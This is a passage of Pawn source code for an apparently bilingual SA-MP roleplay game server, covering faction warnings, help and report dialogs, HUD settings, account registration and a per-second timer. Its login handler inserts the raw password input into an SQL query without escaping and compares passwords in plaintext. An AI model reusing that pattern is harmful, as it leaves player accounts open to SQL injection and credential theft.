    mysql_format(SQL,str,sizeof(str),"update users set `FWarn` = '%d',`FactionTime` = '%d' WHERE `id` = '%d'",fwarn+1,fcttime + 7*86400,MemberSelect[playerid]);
    mysql_tquery(SQL,str,"","");
    GetPlayerName(playerid, name, sizeof(name));
    foreach(new i : FactionMembers<PlayerInfo[playerid][pMember]>)
    {
        if(PlayerInfo[i][pSQLID]  == MemberSelect[playerid])
        {
            PlayerInfo[i][pFACWarns]++;
            PlayerInfo[i][pFactionTime] += 7*86400;
            format(stringg, sizeof(stringg),"%s gived you a FW (faction warn). Your rank up date was changed (+7 days from now)",name);
            SendClientMessage(i, COLOR_GENANNOUNCE, stringg);
        }
    }
    format(str,sizeof(str),"%s received a faction warn from %s. FW: %d/3.",name2,name,(fwarn+1));
    SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, 0, str);
    // log factiune
    return 1;
}

Dialog:DIALOG_FUNWARN(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    new str[256],stringg[128],fwarn,name[30],name2[30],result[30],fcttime;
    format(stringg, sizeof(stringg), "SELECT * FROM `users` WHERE `id` = '%d'",MemberSelect[playerid]);
    new Cache: membresult = mysql_query(SQL,stringg);
    for(new i, j = cache_get_row_count (); i != j; ++i)
    {
        //idd = cache_get_field_content_int(i, "id");
        cache_get_field_content(i, "name", result); format(name2, 30, result);
        fwarn = cache_get_field_content_int(i, "FWarn");
        fcttime = cache_get_field_content_int(i, "FactionTime");
    }
    cache_delete(membresult);
    if(fwarn == 0) return SendClientMessage(playerid, -1, "Acel membru nu are niciun FW.");
    mysql_format(SQL,str,sizeof(str),"update users set `FWarn` = '%d',`FactionTime` = '%d' WHERE `id` = '%d'",fwarn-1,fcttime-7*86400,MemberSelect[playerid]);
    mysql_tquery(SQL,str,"","");
    GetPlayerName(playerid, name, sizeof(name));
    foreach(new i : FactionMembers<PlayerInfo[playerid][pMember]>)
    {
        if(PlayerInfo[i][pSQLID] == MemberSelect[playerid])
        {
            PlayerInfo[i][pFACWarns]--;
            PlayerInfo[i][pFactionTime] -= 7*86400;
            format(stringg, sizeof(stringg),"%s cleared a FW (faction warn).",name);
            SendClientMessage(i, COLOR_GENANNOUNCE, stringg);
        }
    }
    format(str,sizeof(str),"%s got a FW clear from %s.",name2,name);
    SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, 0, str);
    // log factiune
    return 1;
}

Dialog:DIALOG_FPUNINVITE(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    new
        result[30],name[30], reason[128], rank,ftime;
    
    format(gString, sizeof gString, "SELECT * FROM `users` WHERE `id` = '%d'",MemberSelect[playerid]);
    new Cache: membresult = mysql_query(SQL, gString);
    for(new i, j = cache_get_row_count (); i != j; ++i)
    {
        cache_get_field_content(i, "name", result); format(name, 30, result);
        ftime = cache_get_field_content_int(i, "FactionJoin");
        rank = cache_get_field_content_int(i, "Rank");
        //idd = cache_get_field_content_int(i, "id");
    }
    cache_delete(membresult);

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Member` = '0', `Rank` = '0', `FPunish` = '40', `FWarn` = '0', `FactionJoin` = '0' where `id` = '%d';", MemberSelect[playerid]);
    mysql_tquery(SQL, gString, "", "");
    
    mysql_real_escape_string(inputtext, reason);

    foreach(new i : FactionMembers<PlayerInfo[playerid][pMember]>)
    {
        if(PlayerInfo[i][pSQLID] == MemberSelect[playerid])
        {
            WhenPlayerGotUninvited(i, 40);
            SetPlayerSkinEx(playerid);

            format(gString, sizeof gString, "Ai fost demis de liderul %s\n din factiunea din care faceai parte %s (rank %d)\n dupa %d days, cu 40 FP. Motiv: %s.", PlayerInfo[playerid][pNormalName], NumeFactiune(PlayerInfo[playerid][pMember]), rank, TSToDays(ftime), reason);
            Dialog_Show(i, 0, DIALOG_STYLE_MSGBOX, "Uninvite", gString, "Inchide", "");

            break;
        }
    }
    format(gString, sizeof gString, "%s was uninvited by %s from faction %s (rank %d) after %d days, with 40 FP. Reason: %s.", name,PlayerInfo[playerid][pNormalName],DynamicFactions[PlayerInfo[playerid][pMember]][fName],rank,TSToDays(ftime),reason);
    SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, 0, gString);

    return 1;
}

Dialog:DIALOG_NOUNINVITE(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    new
        result[30],name[30], reason[128], rank,ftime, dialogString[144];
    
    format(gString, sizeof gString, "SELECT * FROM `users` WHERE `id` = '%d'",MemberSelect[playerid]);
    new Cache: membresult = mysql_query(SQL, gString);
    for(new i, j = cache_get_row_count (); i != j; ++i)
    {
        cache_get_field_content(i, "name", result); format(name, 30, result);
        ftime = cache_get_field_content_int(i, "FactionJoin");
        rank = cache_get_field_content_int(i, "Rank");
        //idd = cache_get_field_content_int(i, "id");
    }
    cache_delete(membresult);

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Member` = '0', `Rank` = '0', `FPunish` = '0', `FWarn` = '0', `FactionJoin` = '0' where `id` = '%d';", MemberSelect[playerid]);
    mysql_tquery(SQL, gString, "", "");
    
    mysql_real_escape_string(inputtext, reason);

    foreach(new i : FactionMembers<PlayerInfo[playerid][pMember]>)
    {
        if(PlayerInfo[i][pSQLID] == MemberSelect[playerid])
        {
            WhenPlayerGotUninvited(i, 0);
            SetPlayerSkinEx(playerid);

            format(dialogString, sizeof dialogString, "Ai fost demis de liderul %s\n din factiunea din care faceai parte %s (rank %d)\n dupa %d days, cu 0 FP. Motiv: %s.", PlayerInfo[playerid][pNormalName], NumeFactiune(PlayerInfo[playerid][pMember]), rank, TSToDays(ftime), reason);
            Dialog_Show(i, 0, DIALOG_STYLE_MSGBOX, "Uninvite", dialogString, "Inchide", "");

            break;
        }
    }
    format(gString, sizeof gString, "%s was uninvited by %s from faction %s (rank %d) after %d days, with 0 FP. Reason: %s.", name,PlayerInfo[playerid][pNormalName],DynamicFactions[PlayerInfo[playerid][pMember]][fName],rank,TSToDays(ftime),reason);
    SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, 0, gString);

    return 1;
}

Dialog:DIALOG_CANCELCP(playerid, response, listitem, inputtext[])
{
    return Command_ReProcess(playerid, "killcp", false);
}

Dialog:DIALOG_GOTOJOB(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;
    
    SCM(playerid, -1, "You have been teleported.");

    SetPlayerInterior(playerid, 0);
    SetPlayerVirtualWorld(playerid, 0);

    s_PlayerInfo[playerid][pSInHQ] = 0;
    s_PlayerInfo[playerid][pSInHouse] = 0;
    s_PlayerInfo[playerid][pSInBusiness] = 0;

    return SetPlayerPos(playerid, jobPositions[listitem+1][0], jobPositions[listitem+1][1], jobPositions[listitem+1][2]);
}

Dialog:DIALOG_SPAWNCHANGE(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    PlayerInfo[playerid][pSpawnChange] = listitem;

    mysql_format(SQL, gString, sizeof gString, "update `users` set `SpawnChange` = '%d' where `id` = '%d';", PlayerInfo[playerid][pSpawnChange], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    return SCM(playerid, -1, "Locatia de spawn a fost modificata cu succes.");
}

Dialog:DIALOG_HELP(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    switch(listitem)
    {
        case 0: Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: General Commands", "{FFFFFF}/stats /accept /eject /ad /admins\n/killcp /ad /admins\n/helpers /time /id /changepass /pay\n/buylevel /fill /fillgascan /gps /shop\n/contract /service /buydrink /licences", "Back", "Exit");
        case 1: Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: Chat Commands", "{FFFFFF}/o (global OOC message)\n/n (newbie chat message)\n/sms (OOCly SMS another player)\n/b (local OOC message)\n/w(hisper)\n/low (quiet message)\n/me (action)\n/do (action)\n/wt (walkie talkie)", "Back", "Exit");
        case 2:
        {
            if(PlayerInfo[playerid][pMember] == 0)
                return Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: Chat Commands", "{FFFFFF}You're not in a group.", "Back", "Exit");
        }
        case 3: Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: House Commands", "{FFFFFF}/home /open /renters /evict /evictall /housename /hu /housemenu", "Back", "Exit");
        case 4:
        {
            Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", "{FFFFFF}You don't have a public job or your job does not have any commands.", "Back", "Exit"); 
        }
        case 5: Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: Business Commands", "{FFFFFF}/bizstatus /bizfee /bizname /open /sellbizto /sellbiztostate /bizwithdraw", "Back", "Exit");
        case 6:
        {
            if(PlayerInfo[playerid][pHelper] == 0)
                return SCM(playerid, COLOR_GREY, "You aren't an official helper.");

            Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: Helper Commands", "{FFFFFF}/n /nsend /nskip /ndelete /nmute /nreport /hquestions /nnext /hduty\n/slap /hre /up /spec /specoff", "Back", "Exit");
        }
        case 7: Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: Vehicle Commands", "{FFFFFF}/v /lock /findcar /park /towcar /engine /removetunning /givekey /sellcarto", "Back", "Exit");
        case 8: Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: Bank Commands", "{FFFFFF}/balance /withdraw /deposit", "Back", "Exit");
        case 9:
        {
            if(PlayerInfo[playerid][pMember] == 0)
                return SCM(playerid, -1, "You are not a leader.");

            Dialog_Show(playerid, DIALOG_HELP_RETURN, DIALOG_STYLE_MSGBOX, "SERVER: Leader Help", "{FFFFFF}/invite /givesalary /l /togapps /lockhq\n/granknames /fvrespawn /members /vrank /leaderinfo /toglc\n(departments) /gov", "Back", "Exit");
        }
    }
    return 1;
}

Dialog:DIALOG_HELP_RETURN(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    return Dialog_Show(playerid, DIALOG_HELP, DIALOG_STYLE_LIST, "SERVER: Commands", "General\nChat\nFactions\nHouses\nJobs\nBusinesses\nHelpers\nVehicles\nBank\nRob\nLeaders\nClans", "Select", "Exit");
}

Dialog:DIALOG_REPORT(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    switch(listitem)
    {
        case 0:
        {
            SCM(playerid, COLOR_WHITE, "Reportul tau a fost trimis administratiei cu succes!");

            foreach(new i : Spectators)
            {
                if(s_PlayerInfo[i][pSPlayerSpec] == playerid)
                {
                    ABroadCast(COLOR_REPORT, 1, "%s [%d] is {FFC000}stuck - {FFFFFF}auto assigned to %s (%d)", GetName(playerid), playerid, GetName(i), i);
                    onPlayerReportSent(playerid, -1, REPORT_TYPE_STUCK, gettime(), 300, 1);
                    return 1;
                }
            }

            ABroadCast(COLOR_REPORT, 1, "%s [%d] is {FFC000}stuck", GetName(playerid), playerid);
            onPlayerReportSent(playerid, -1, REPORT_TYPE_STUCK, gettime(), 300);
        }
        case 1:
        {

        }
        case 2:
            SendSplitMessage(playerid, COLOR_WHITE, "Optiune dezactivata. Pentru efectuarea negoturilor pe server este implementat un sistem de 'TRADE'. Pentru a face un negot cu un jucator tasteaza comanda /trade [nume / id].");
        case 3:
            Dialog_Show(playerid, 0, DIALOG_STYLE_MSGBOX, "Cont blocat", "Cont blocat\nDaca ai contul blocat automat trebuie sa il deblochezi de pe adresa de email.\nDaca ai contul blocat de catre un admin, deschide un tichet pe panel.convicted.ro\nDe acolo vei putea deschide un ticket pentru a discuta cu adminii despre ce a cauzat blocarea contului tau.\nAdminii NU iti vor debloca contul din joc. Nu are rost sa intrebi pe /report cum poti sa iti deblochezi contul. Nu vei primi raspuns.\nCont spart\nDaca ai contul spart, tot ce poti face e sa deschizi un ticket si sa astepti un raspuns. De obicei se primesc raspunsuri in mai putin de 24 ore.\nDaca ti-a fost spart contul e DOAR vina ta. Nu sunt adminii vinovati si nimeni nu are vreo obligatie de a te ajuta.\nTotusi, incercam sa ajutam playerii ce pot fi ajutati. Deci, deschide un ticket si asteapta un raspuns.\nPentru a deschide un ticket, intra pe panel.convicted.ro > Ticket > Deschide ticket nou.\nNu da /report pentru a zice adminilor sa raspunda mai repede la tickete. Vei primi suspend pe /report si atat.", "Inchide", "");
        case 4:
            Dialog_Show(playerid, DIALOG_REPORT_TYPE_DM, DIALOG_STYLE_INPUT, "Raportare DM", "Introduceti ID-ul/numele playerului care v-a atacat.", "Introdu", "Inapoi");
        case 5:
            Dialog_Show(playerid, 0, DIALOG_STYLE_MSGBOX, "Raportare Cheater", "Daca cunosti numele jucatorului ce a folosit coduri tasteaza comanda /cheats [id] [cod]", "Ok", "");
        case 6:
            Dialog_Show(playerid, 0, DIALOG_STYLE_MSGBOX, "Donatii/Plati", "Pentru a dona si a primi puncte premium pe acest server, intrati pe panelul nostru.", "Inchide", "");
    }

    return 1;
}

Dialog:DIALOG_REPORT_TYPE_DM(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    Command_ReProcess(playerid, "dm %s", false);

    return 1;
}

Dialog:DIALOG_HUD(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    switch(listitem)
    {
        case 0:
        {
            SetPVarInt(playerid, "hud_selected", 1);
            Dialog_Show(playerid, DIALOG_HUD_COLOR, DIALOG_STYLE_LIST, "HUD Options: HP", "{FFFFFF}Disable\n{C0C0C0}Grey\n{990000}Red\n{00ff00}Green\n{0000ff}Blue\n{ffff00}Yellow", "Select", "Cancel");
        }
        case 1:
        {
            SetPVarInt(playerid, "hud_selected", 2);
            Dialog_Show(playerid, DIALOG_HUD_COLOR, DIALOG_STYLE_LIST, "HUD Options: Armour", "{FFFFFF}Disable\n{C0C0C0}Grey\n{990000}Red\n{00ff00}Green\n{0000ff}Blue\n{ffff00}Yellow", "Select", "Cancel");
        }
        case 2:
        {
            PlayerTextDrawHide(playerid, FPSHud[playerid]);
            SCMF(playerid, -1, "FPS option updated! (now %s)", PlayerInfo[playerid][pHUD][2] ? ("disabled") : ("enabled"));
            PlayerInfo[playerid][pHUD][2] = PlayerInfo[playerid][pHUD][2] ? 0 : 1;
        }
        case 3:
        {
            SCM(playerid, -1, "Damage informer updated!");
            PlayerInfo[playerid][pHUD][3] = PlayerInfo[playerid][pHUD][3] ? 0 : 1;
            //SetDamageFeedForPlayer(playerid, PlayerInfo[playerid][pHUD][3]);
        }
        case 4:
        {
            SCMF(playerid, -1, "Payday option updated! (now %s)", PlayerInfo[playerid][pHUD][4] ? ("message") : ("textdraw"));
            PlayerInfo[playerid][pHUD][4] = PlayerInfo[playerid][pHUD][4] ? 0 : 1;
        }
        case 5:
        {
            SCMF(playerid, -1, "Level progress option updated! (now %s)", PlayerInfo[playerid][pHUD][5] ? ("disabled") : ("enabled"));
            PlayerInfo[playerid][pHUD][5] = PlayerInfo[playerid][pHUD][5] ? 0 : 1;
            
            if(PlayerInfo[playerid][pHUD][5])
                updateLevelProgress(playerid);
            else
                HidePlayerProgressBar(playerid, HUDProgress[playerid]), PlayerTextDrawHide(playerid, HudTD[playerid]);
        }
        case 6:
        {
            SCMF(playerid, -1, "Skills option updated! (now %s)", PlayerInfo[playerid][pHUD][6] ? ("message") : ("dialog"));
            PlayerInfo[playerid][pHUD][6] = PlayerInfo[playerid][pHUD][6] ? 0 : 1;
        }
        case 7:
        {
            SCMF(playerid, -1, "Speedometer option updated! (now %s)", PlayerInfo[playerid][pHUD][7] ? ("#1") : ("#2"));
            PlayerInfo[playerid][pHUD][7] = PlayerInfo[playerid][pHUD][7] ? 0 : 1;

            if(PlayerInfo[playerid][pHUD][7])
                PlayerTextDrawHide(playerid, veh_speedo[playerid]);
            else
                for(new i; i < 3; ++i) PlayerTextDrawHide(playerid, Speedo[playerid][i]);
        }
        case 8:
        {
            SCMF(playerid, -1, "Money Update option updated! (now %s)", PlayerInfo[playerid][pHUD][8] ? ("disabled") : ("enabled"));
            PlayerInfo[playerid][pHUD][8] = PlayerInfo[playerid][pHUD][8] ? 0 : 1;
        }
        case 9:
        {
            SCMF(playerid, -1, "'Plus Icon' option updated! (now %s)", PlayerInfo[playerid][pHUD][9] ? ("disabled") : ("enabled"));
            PlayerInfo[playerid][pHUD][9] = PlayerInfo[playerid][pHUD][9] ? 0 : 1;
        }
        case 10:
        {
            SCMF(playerid, -1, "Speedometer option updated! (now %s)", PlayerInfo[playerid][pHUD][10] ? ("disabled") : ("enabled"));
            PlayerInfo[playerid][pHUD][10] = PlayerInfo[playerid][pHUD][10] ? 0 : 1;
        }
        case 11:
        {
            SCMF(playerid, -1, "Payday time option updated! (now %s)", PlayerInfo[playerid][pHUD][11] ? ("disabled") : ("enabled"));
            PlayerInfo[playerid][pHUD][11] = PlayerInfo[playerid][pHUD][11] ? 0 : 1;
        }
    }

    if(!GetPVarInt(playerid, "hud_selected"))
    {
        mysql_format(SQL, gString, sizeof gString, "update `users` set `HUDOptions` = '%d %d %d %d %d %d %d %d %d %d %d %d' where `id` = '%d';", PlayerInfo[playerid][pHUD][0], PlayerInfo[playerid][pHUD][1], PlayerInfo[playerid][pHUD][2], PlayerInfo[playerid][pHUD][3], PlayerInfo[playerid][pHUD][4], PlayerInfo[playerid][pHUD][5], PlayerInfo[playerid][pHUD][6], PlayerInfo[playerid][pHUD][7], PlayerInfo[playerid][pHUD][8], PlayerInfo[playerid][pHUD][9], PlayerInfo[playerid][pHUD][10], PlayerInfo[playerid][pHUD][11], PlayerInfo[playerid][pSQLID]);
        mysql_tquery(SQL, gString, "", "");
    }

    return 1;
}

Dialog:DIALOG_HUD_COLOR(playerid, response, listitem, inputtext[])
{
    if(!response)
        return DeletePVar(playerid, "hud_selected");

    SCM(playerid, -1, "HUD options updated!");

    new
        listItemId = GetPVarInt(playerid, "hud_selected");
    
    PlayerInfo[playerid][pHUD][listItemId-1] = listitem;

    mysql_format(SQL, gString, sizeof gString, "update `users` set `HUDOptions` = '%d %d %d %d %d %d %d %d %d %d %d %d' where `id` = '%d';", PlayerInfo[playerid][pHUD][0], PlayerInfo[playerid][pHUD][1], PlayerInfo[playerid][pHUD][2], PlayerInfo[playerid][pHUD][3], PlayerInfo[playerid][pHUD][4], PlayerInfo[playerid][pHUD][5], PlayerInfo[playerid][pHUD][6], PlayerInfo[playerid][pHUD][7], PlayerInfo[playerid][pHUD][8], PlayerInfo[playerid][pHUD][9], PlayerInfo[playerid][pHUD][10], PlayerInfo[playerid][pHUD][11], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");
    return 1;
}

Dialog:DIALOG_WANTED(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    new
        targetId = s_PlayerInfo[playerid][pSDialogItems][listitem];

    ShowPlayerMDC(playerid, targetId);
    //set_find_checkpoint(playerid, targetId);
    return 1;
}

Dialog:DIALOG_LOGIN(playerid, response, listitem, inputtext[])
{
    TogglePlayerSpectating(playerid, false);

	mysql_format(SQL, gString, sizeof gString, "select * from `users` where `name` = '%e' and `password` = '%s' limit 1;", GetName(playerid), inputtext);
	mysql_tquery(SQL, gString, "WhenPlayerLoggedIn", "i", playerid);
}

Dialog:DIALOG_REGISTER(playerid, response, listitem, inputtext[])
{
    proceed_connect_camera(playerid);
	if(strlen(inputtext) < 3 || strlen(inputtext) > 20)
		Dialog_Show(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, "SERVER: Registration", "Your password must exceed 4 character!\nWelcome to the LocalHost RPG Server.\nPlease enter your desired password bellow!", "Register", "Cancel");

	return OnPlayerRegister(playerid, inputtext);
}

Dialog:DIALOG_REGISTER_TWO(playerid, response, listitem, inputtext[])
{
    proceed_connect_camera(playerid);
	if(response)
    {
    	PlayerInfo[playerid][pLanguage] = 2;

        SCM(playerid, -1, "Limba setata: romana.");
        SCM(playerid, -1, "[EN] To set the language to English, use /eng.");
        SCM(playerid, COLOR_YELLOW, "Alege sexul caracterului tau.");

        Dialog_Show(playerid, DIALOG_REGISTER_THREE, DIALOG_STYLE_LIST, "Alege sexul caracterului", "Barbat\nFemeie", "Alege", "");
    }
    else
    {
        proceed_connect_camera(playerid);
    	PlayerInfo[playerid][pLanguage] = 1;

        SCM(playerid, -1, "Language set to english.");
        SCM(playerid, -1, "[RO] Pentru a seta limba romana foloseste /ro.");
        SCM(playerid, COLOR_YELLOW, "Choose your gender of your character.");

        Dialog_Show(playerid, DIALOG_REGISTER_THREE, DIALOG_STYLE_LIST, "Choose your gender of your character", "Male\nFemale", "Choose", "");
    }
    return 1;
}

Dialog:DIALOG_REGISTER_THREE(playerid, response, listitem, inputtext[])
{
    proceed_connect_camera(playerid);
    if(!listitem)
    {
    	if(PlayerInfo[playerid][pLanguage] == 2)
        	SCM(playerid, COLOR_YELLOW, "Sex setat: barbat.");

        else
        	SCM(playerid, COLOR_YELLOW, "Good! Gender set to: man.");

        PlayerInfo[playerid][pSex] = 1;
    	PlayerInfo[playerid][pModel] = 36;
    }
    else
    {
        proceed_connect_camera(playerid);
    	if(PlayerInfo[playerid][pLanguage] == 2)
        	SCM(playerid, COLOR_YELLOW, "Sex setat: femeie.");

		else
        	SCM(playerid, COLOR_YELLOW, "Good! Gender set to: feman.");

        PlayerInfo[playerid][pSex] = 0;
        PlayerInfo[playerid][pModel] = 145;
    }
    SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);

	return Dialog_Show(playerid, DIALOG_REGISTER_FOUR, DIALOG_STYLE_INPUT, (PlayerInfo[playerid][pLanguage] == 2 ? ("Varsta") : ("Character age")), (!PlayerInfo[playerid][pLanguage] ? ("Scrie varsta caracterului tau:") : ("Type the age of your character bellow:")), "Ok", "");
}

Dialog:DIALOG_REGISTER_FOUR(playerid, response, listitem, inputtext[])
{
    proceed_connect_camera(playerid);
    if(strval(inputtext) > 1 && strval(inputtext) < 100)
    {
    	PlayerInfo[playerid][pAge] = strval(inputtext);

    	if(PlayerInfo[playerid][pLanguage] == 2)
    	{
    		SCM(playerid, -1, "Introdu adresa de email. Daca nu vrei sa-ti setezi email-ul, poti apasa ok.");
    		SCM(playerid, -1, "Emailul te poate ajuta pentru a-ti recupera parola, in caz ca o uiti.");
    	}
    	else
    	{
    		SCM(playerid, -1, "Type your email. If you don't want to set your email, just click ok.");
    		SCM(playerid, -1, "The email will help you to recover your password, in case you loose it.");
    	}

        return Dialog_Show(playerid, DIALOG_REGISTER_FIVE, DIALOG_STYLE_INPUT, "Email", "(ex: my_email@yahoo.com)", "Ok", "");
    }
    else return Dialog_Show(playerid, DIALOG_REGISTER_FOUR, DIALOG_STYLE_INPUT, (PlayerInfo[playerid][pLanguage] == 2 ? ("Varsta") : ("Character age")), (PlayerInfo[playerid][pLanguage] == 2 ? ("Scrie varsta caracterului tau:") : ("Type the age of your character bellow:")), "Ok", "");
}

Dialog:DIALOG_REGISTER_FIVE(playerid, response, listitem, inputtext[])
{
	if(IsMail(inputtext))
	{
		if(PlayerInfo[playerid][pLanguage] == 2)
			SCMF(playerid, COLOR_YELLOW, "Email setat: %s.", inputtext);
		else
			SCMF(playerid, COLOR_YELLOW, "Email set to: %s.", inputtext);

		format(PlayerInfo[playerid][pEmail], 32, inputtext);
	}
	else
	{
		if(PlayerInfo[playerid][pLanguage] == 2)
			SCM(playerid, COLOR_YELLOW, "Ai ales sa nu introduci emailul. Daca vrei sa-ti setezi un email pe cont in viitor, il poti seta de pe panel.");
		else
			SCM(playerid, COLOR_YELLOW, "You choosed not to set an email. You can visit the panel and set an email at a later date, if you want to.");
	}

	for(new i; i <= 5; i++)
		SCM(playerid, -1, "");

    SCM(playerid, -1, "Contul tau a fost inregistrat cu succes in baza noastra de date.");
    SCM(playerid, -1, "Daca ai intrebari legate de joc, foloseste /n si helperii de pe server vor incerca sa te ajute.");
    SCM(playerid, -1, "Daca doresti sa dai de permis, urmareste checkpoint-ul plasat de serverul nostru pentru a da de permis.");
    SCM(playerid, -1, "Daca nu, oricand doresti il poti gasi prin intermediul comenzii </gps>.");
    SCM(playerid, -1, "Iti uram distractie si un joc cat mai placut!");
    SetPlayerCheckpoint(playerid, 1219.3429,-1812.7673,16.5938, 2.0), s_PlayerInfo[playerid][pSCP] = 1; 
    PlayerInfo[playerid][pTut] = 1;
    SpawnPlayer(playerid);

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Tutorial` = '1', `Language` = '%d', `Email` = '%s', `Sex` = '%d', `Age` = '%d', `Model` = '%d' where `id` = '%d';", PlayerInfo[playerid][pLanguage], PlayerInfo[playerid][pEmail], PlayerInfo[playerid][pSex], PlayerInfo[playerid][pAge], PlayerInfo[playerid][pModel], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gString, "", "");
	return 1;
}

// ======== TIMERS ========
GetWeekDay(day=0, month=0, year=0) {
    if(!day) getdate(year, month, day);
    new weekday_str[10], j, e;
    if(month <= 2) {
        month += 12;
        --year;
    }

    j = year % 100;
    e = year / 100;

    switch ((day + (month+1)*26/10 + j + j/4 + e/4 - 2*e) % 7) {
        case 0: weekday_str = "Saturday";
        case 1: weekday_str = "Sunday";
        case 2: weekday_str = "Monday";
        case 3: weekday_str = "Tuesday";
        case 4: weekday_str = "Wednesday";
        case 5: weekday_str = "Thursday";
        case 6: weekday_str = "Friday";
    }
    return weekday_str;
}
    //dadada
task OneSecondTimer[1000]()
{
    new year, month, day;
    getdate(year, month, day);
    new days[32]; // Adjusted the size to hold days of the week

    format(days, sizeof(days), GetWeekDay(day, month, year));   

    new hour, minute, second, hours, minutes, seconds;
    gettime(hour, minute, second);
    gettime(hours, minutes, seconds);   

    new formattedDate[20]; // Adjusted the size
    format(formattedDate, sizeof(formattedDate), "%02d.%02d.%04d", day, month, year);
    TextDrawSetString(Date, formattedDate);

    new formattedTime[10]; // Adjusted the size
    format(formattedTime, sizeof(formattedTime), "%02d:%02d", hours, minutes);
    TextDrawSetString(Time, formattedTime);
	foreach(new i : Player)
	{
		if(!s_PlayerInfo[i][pSLoggedIn])
			continue;
		
		afk_helper_check(i);
		checkInfoAboutVehicle();

		if(PlayerInfo[i][pHUD][2])
		{

            if(!PlayerInfo[i][pAdmin])
            {
                format(gString, sizeof gString, "FPS:_~g~%d", s_PlayerInfo[i][pSFPS]);
                PlayerTextDrawSetString(i, FPSHud[i], gString);
                PlayerTextDrawShow(i, FPSHud[i]);
            }
            else if(PlayerInfo[i][pAdmin] < 5)
            {
                format(gString, sizeof gString, "FPS:_~g~%d~w~~h~_/_REPORTS:_~r~%d~w~~h~_/_CHEATERS:_~r~%d~w~~h~_/_ANIM: ~r~%d", s_PlayerInfo[i][pSFPS], Iter_Count(sendReport), Iter_Count(Cheaters), GetPlayerAnimationIndex(i));
                PlayerTextDrawSetString(i, FPSHud[i], gString);
                PlayerTextDrawShow(i, FPSHud[i]);
            }
            else
            {
                format(gString, sizeof gString, "FPS:_~g~%d~w~~h~_/_REPORTS:_~r~%d~w~~h~_/_CHEATERS:_~r~%d~w~~h~_/_ANIM: ~r~%d~w~~h~_/_TICKS:_~y~%d~w~~h~_/_QUERIES:_~b~%d", s_PlayerInfo[i][pSFPS], Iter_Count(sendReport), Iter_Count(Cheaters), GetPlayerAnimationIndex(i), GetServerTickRate(), mysql_unprocessed_queries());
                PlayerTextDrawSetString(i, FPSHud[i], gString);
                PlayerTextDrawShow(i, FPSHud[i]); 
            }
		}

		if(GetPlayerDrunkLevel(i) < 100)
			SetPlayerDrunkLevel(i, 2000);
        else
        {
            if(s_PlayerInfo[i][pSDrunkLevelLast] != GetPlayerDrunkLevel(i))
            {
                new
                	FPS = s_PlayerInfo[i][pSDrunkLevelLast] - GetPlayerDrunkLevel(i);

                if(FPS > 0)
                	s_PlayerInfo[i][pSFPS] = FPS;
                
                s_PlayerInfo[i][pSDrunkLevelLast] = GetPlayerDrunkLevel(i);
            }
        }

        if(PlayerInfo[i][pPaydayTime])
        {
            if(PlayerInfo[i][pPaydayTime] <= gettime())
                onPlayerGotPayday(i);

            if(PlayerInfo[i][pHUD][11])
            {
                format(gString, sizeof gString, "next payday in: ~r~%s", CalculeazaTimp2(PlayerInfo[i][pPaydayTime] - gettime()));
                PlayerTextDrawSetString(i, PayDayTD[i][0], gString);
                PlayerTextDrawShow(i, PayDayTD[i][0]); 
            }
        }
        
        //ppayday
        //update ppayday de facut restu pe mai ancolo de test momentan
       // PlayerInfo[i][pPayDay]++;

        if(PlayerInfo[i][pMuted] && PlayerInfo[i][pMuteTime])
        {
            PlayerInfo[i][pMuteTime] --;
            
            if(PlayerInfo[i][pMuteTime] <= 0)
            {
                PlayerInfo[i][pMuted] = 0;
                PlayerInfo[i][pMuteTime] = 0;
                pUpdateInt(i, "MuteTime", PlayerInfo[i][pMuteTime]);

                SCM(i, COLOR_GREY, "You have now been automatically unmuted.");
                mysql_format(SQL, gString, sizeof gString, "update `users` set `Muted` = '0', `MuteTime` = '0' where `id` = '%d';", PlayerInfo[i][pSQLID]);
                mysql_tquery(SQL, gString);
            }
        }

        if(PlayerInfo[i][pCash] != GetPlayerMoney(i)) {
            ResetPlayerMoney(i);
            GivePlayerMoney(i, PlayerInfo[i][pCash]);
        }

        GetPlayerPos(i, s_PlayerInfo[i][pSPos][0], s_PlayerInfo[i][pSPos][1], s_PlayerInfo[i][pSPos][2]);
        
